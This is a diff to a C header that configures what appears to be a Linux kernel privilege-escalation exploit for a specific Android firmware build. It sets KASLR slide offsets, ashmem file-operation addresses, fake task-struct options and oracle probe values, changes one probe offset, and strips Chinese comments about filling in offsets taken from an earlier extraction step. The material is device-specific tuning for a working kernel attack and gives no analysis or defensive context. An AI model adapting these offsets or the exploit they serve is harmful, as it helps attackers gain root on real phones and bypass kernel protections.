@@ -21,7 +21,6 @@
 #define SLIDE_LOCK_OWNER_VALUE 1ULL
 #define SLIDE_USE_FAKE_TASK 1
 
-/* 请将第一步提取出的真实 SLIDE_TRACEFS_WORKER_CALLER_OFF 替换这里 */
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x01d3b2f0ULL
 
 #define SLIDE_P0_OFFSET_CANDIDATES \
@@ -54,9 +53,8 @@
 #define P0_ORACLE_PROBE_RESTORE_SLOT 3
 #define P0_ORACLE_GATE_PAGE_OFF 0x0e80
 #define P0_ORACLE_GATE_OBJECT_INDEX 1
-#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
+#define P0_ORACLE_PROBE_OFFSET 0x1f1000ULL
 
-/* 注意更新这里的指纹头文件路径 */
 #define P0_FINGERPRINT_HEADER \
   "targets/pa3q-S9380ZHU1AYA1/p0_fingerprint.h"
 #endif
@@ -67,7 +65,6 @@
 #define DIRECT_MAP_END 0xffffff9000000000ULL
 #define VMEMMAP_START 0xfffffffe00000000ULL
 
-/* ===== 以下是从第一步提取结果计算出的真实偏移量 ===== */
 #define ASHMEM_MISC_FOPS_OFF 0x02329ee0ULL
 #define ASHMEM_FOPS_OFF 0x0133b148ULL
 #define ASHMEM_IOCTL_OFF 0x00cce300ULL
@@ -93,10 +90,6 @@
 #define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x024c2f28ULL
 #define SLIDE_SYSCTL_BOOTID_OFF 0x024c2f28ULL
 #define SLIDE_PROC_DO_UUID_CTL_TABLE_OFF 0x022e75e0ULL
-/* =============================================================== */
-
-/* 其余内核结构体内的字段偏移（STRUCT_PAGE_... / FAKE_TASK_... / FOPS_... 等）
-   在相同 6.6 内核的大版本下无需修改，保持原样即可 */
 
 #define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
 #define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
